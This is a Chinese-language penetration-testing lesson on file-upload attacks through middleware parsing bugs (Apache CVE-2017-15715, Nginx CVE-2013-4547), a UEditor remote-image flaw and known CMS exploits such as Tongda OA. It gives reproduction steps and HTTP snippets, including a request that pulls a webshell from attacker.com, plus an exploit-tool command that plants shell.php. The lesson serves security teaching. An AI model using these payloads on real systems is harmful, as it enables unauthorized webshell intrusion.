# 🛠️ 课程P48：PHP应用安全拓展 - 中间件、编辑器与CMS漏洞解析

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_1.png)

在本节课中，我们将学习文件上传安全问题的三个拓展层面：中间件漏洞、第三方编辑器漏洞以及已知CMS漏洞。这些内容并非新的攻击技术，而是理解安全问题可能产生的不同“层面”和“思路”。我们将通过案例复现，帮助你建立更全面的安全视野。

---

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_3.png)

## 🔍 概述：安全问题的不同层面

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_5.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_7.png)

上一节我们介绍了针对“原生态”文件上传功能的攻防测试。所谓“原生态”，是指在未知目标网站源码和具体信息的情况下，仅凭一个上传点，通过测试方法判断其安全缺陷。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_9.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_11.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_13.png)

本节中我们来看看另一种情况：文件上传功能本身的代码逻辑可能是安全的，但由于其运行环境（中间件）、引用的第三方组件（编辑器）或程序本身（CMS）存在已知漏洞，导致整个上传功能可以被利用。理解这些层面，能帮助你在渗透测试或代码审计时，更准确地定位问题根源。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_15.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_17.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_19.png)

---

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_21.png)

## 🖥️ 中间件层面的安全问题

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_23.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_25.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_27.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_29.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_31.png)

中间件（如Apache、Nginx）是承载Web应用程序的服务器软件。其自身的安全漏洞可能会“联动”文件上传功能，形成攻击入口。需要注意的是，这类漏洞通常有严格的版本限制，实战中同时满足漏洞条件、存在上传点且未打补丁的情况较少，因此略显“鸡肋”，但了解其原理依然重要。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_32.png)

以下是两个与文件上传相关的中间件漏洞案例。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_34.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_36.png)

### 1. Apache HTTPD 换行解析漏洞 (CVE-2017-15715)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_38.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_40.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_42.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_44.png)

**影响版本**：Apache 2.4.0 到 2.4.29。
**漏洞原理**：当上传的文件名在特定位置（`%0a`）包含换行符时，Apache会错误地解析，导致可以绕过某些后缀检查。
**利用条件**：
1.  目标Apache版本在受影响范围内。
2.  存在文件上传点。
3.  上传点允许用户控制最终保存的文件名（例如存在重命名操作）。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_46.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_48.png)

**漏洞复现步骤**：
1.  启动漏洞环境（例如使用Vulhub的`CVE-2017-15715`镜像）。
2.  访问上传页面，尝试上传一个包含PHP代码的`.php`文件，通常会被拦截。
3.  通过抓包工具（如Burp Suite）拦截上传请求。
4.  在文件名（如`shell.php`）的扩展名之后，十六进制编辑插入一个`%0a`（换行符），例如将`shell.php`修改为`shell.php%0a`。
5.  放行数据包，文件上传成功。
6.  访问上传后的文件路径（需包含`%0a`），Apache会将其解析为PHP文件并执行其中的代码。

```http
# 修改前
Content-Disposition: form-data; name="file"; filename="shell.php"

# 修改后（在十六进制视图中将0d0a改为0a）
Content-Disposition: form-data; name="file"; filename="shell.php%0a"
```

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_50.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_52.png)

### 2. Nginx 解析漏洞 (CVE-2013-4547)

**影响版本**：Nginx 0.8.41 到 1.4.3 / 1.5.0 到 1.5.7。
**漏洞原理**：该漏洞源于Nginx对路径的解析逻辑错误。当请求的URI路径中包含空格和`.php`等字符时，Nginx可能会错误地将一个非PHP文件当作PHP脚本执行。
**利用条件**：
1.  目标Nginx版本在受影响范围内。
2.  存在任意文件上传点（上传图片等静态文件即可）。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_54.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_56.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_58.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_60.png)

**漏洞复现步骤**：
1.  启动漏洞环境（例如Vulhub的`CVE-2013-4547`）。
2.  上传一个包含PHP代码的图片文件（如`shell.jpg`）。
3.  访问该图片时，在URL路径后添加`空格`和`.php`（需进行URL编码）。例如，访问 `/upload/shell.jpg .php`（实际空格需编码为`%20`）。
4.  Nginx错误地将`shell.jpg`解析为PHP文件并执行。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_62.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_64.png)

```http
# 访问示例
GET /upload/shell.jpg%20%00.php HTTP/1.1
```

**过渡**：以上我们看到了中间件漏洞如何“辅助”文件上传进行攻击。接下来，我们将视角从运行环境转移到应用程序本身所集成的第三方组件。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_66.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_68.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_70.png)

---

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_72.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_74.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_76.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_78.png)

## 📝 第三方编辑器漏洞

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_80.png)

许多网站为了快速实现富文本编辑、文件管理等功能，会直接集成第三方编辑器（如UEditor、KindEditor）。这些编辑器本身可能包含安全漏洞，一旦网站引用了存在漏洞的版本，攻击者就可以通过编辑器的功能点（如上图、上传文件）实施攻击。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_82.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_84.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_86.png)

**核心思路**：漏洞并非网站自身代码编写问题，而是由于引用了存在缺陷的第三方组件。在渗透测试中，通过信息收集发现此类编辑器目录，并确认其版本存在漏洞，是重要的突破口。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_88.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_90.png)

以下是一个UEditor编辑器任意文件上传漏洞的案例。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_92.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_94.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_96.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_98.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_99.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_101.png)

### UEditor 编辑器漏洞利用

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_103.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_105.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_107.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_109.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_111.png)

**影响版本**：主要影响某些特定版本（例如.NET版 v1.4.3.3之前）。
**漏洞原理**：编辑器在处理远程图片抓取等功能时，对文件后缀过滤不严，导致可以将远程服务器上的恶意脚本文件保存到本地，并以后门文件形式存储。
**利用流程**：
1.  **信息收集**：通过目录扫描发现网站存在 `/ueditor/` 或类似路径。
2.  **版本确认**：访问编辑器页面，查看其版本信息，判断是否在漏洞影响范围内。
3.  **漏洞利用**：利用公开的EXP或手动构造请求，触发编辑器的“远程图片抓取”或“文件上传”功能，将包含后门代码的图片URL提交给服务器，并利用漏洞将其保存为可执行的脚本文件（如`.aspx`）。
4.  **访问后门**：获取上传后的文件路径，直接访问即可获得WebShell。

```http
# 示例请求（具体参数因版本而异）
POST /ueditor/net/controller.ashx?action=catchimage HTTP/1.1
...
source[]=http://attacker.com/shell.jpg?.aspx
```

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_113.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_115.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_117.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_119.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_121.png)

**过渡**：编辑器漏洞是“供应链安全”问题的典型体现。下面，我们将探讨另一种更常见的、与具体应用程序绑定的漏洞类型。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_123.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_125.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_127.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_129.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_131.png)

---

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_133.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_134.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_135.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_137.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_139.png)

## 🏗️ 已知CMS/框架漏洞利用

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_141.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_143.png)

当目标网站使用已知的开源CMS（如WordPress、通达OA、ThinkPHP等）或框架时，安全测试的思路会发生根本性转变。我们无需再盲目地测试其原生上传功能，而应优先查找该CMS已公开的漏洞。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_145.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_147.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_149.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_151.png)

**核心思路**：从“黑盒测试”转向“已知漏洞利用”。只要识别出CMS类型和版本，就可以直接使用针对该漏洞的专用检测工具或EXP进行测试，效率极高。

以下是利用已知CMS漏洞的通用流程。

### 通用利用流程：以通达OA为例

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_153.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_155.png)

1.  **识别CMS**：通过页面特征、HTTP头、特定文件/目录等方式，确定目标使用的是“通达OA”系统。
2.  **搜索漏洞**：在漏洞库（如CNVD、CNNVD）、安全社区或利用工具集合中搜索“通达OA 文件上传漏洞”。
3.  **使用工具**：运行针对该漏洞的专用检测/利用工具（如某些综合扫描器的插件或独立EXP脚本）。
4.  **执行利用**：工具会自动向存在漏洞的接口发送构造好的数据包，完成文件上传和WebShell写入。
5.  **验证结果**：访问工具返回的Shell地址，确认利用成功。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_157.png)

```bash
# 示例：使用某漏洞利用工具（非真实命令）
python tongda-oa_rce.py -u http://target.com -f shell.php
```

**关键点**：这种方式的成功率取决于漏洞是否真实存在且未修复。它跳过了对具体功能点的寻找和绕过测试，直接进行“定点打击”。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_159.png)

---

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_161.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_163.png)

## 🛡️ 总结与思路梳理

本节课中我们一起学习了文件上传安全问题的三个拓展层面：

1.  **中间件漏洞**：Apache、Nginx等服务器软件自身的解析漏洞，可能被用来绕过上传限制。实战中需同时满足版本、上传点、特定条件，较为少见。
2.  **第三方编辑器漏洞**：网站引用的编辑器组件（如UEditor）存在安全缺陷，导致通过编辑器功能上传后门。信息收集时发现此类组件是重要突破口。
3.  **已知CMS漏洞**：针对使用知名CMS或框架的网站，最有效的思路是直接查找和利用其已公开的漏洞，使用专用工具进行自动化攻击。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_165.png)

**核心收获**：本课的重点不在于传授新的攻击技巧，而在于建立**分层分类的安全思维**。在进行安全评估时，你需要清晰地判断：
*   面对一个未知的上传点，进行“原生态”攻防测试。
*   发现中间件特定版本，可尝试关联的解析漏洞。
*   扫描到第三方编辑器目录，应优先检查其历史漏洞。
*   识别出具体CMS/框架，则直接转向已知漏洞利用。

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_166.png)

![](img/5b24ccd9c1dad2cc76c22c7bb1b30691_168.png)

这种思维方式，无论是对于渗透测试、代码审计还是安全建设，都至关重要。它帮助你更系统、更高效地定位风险所在。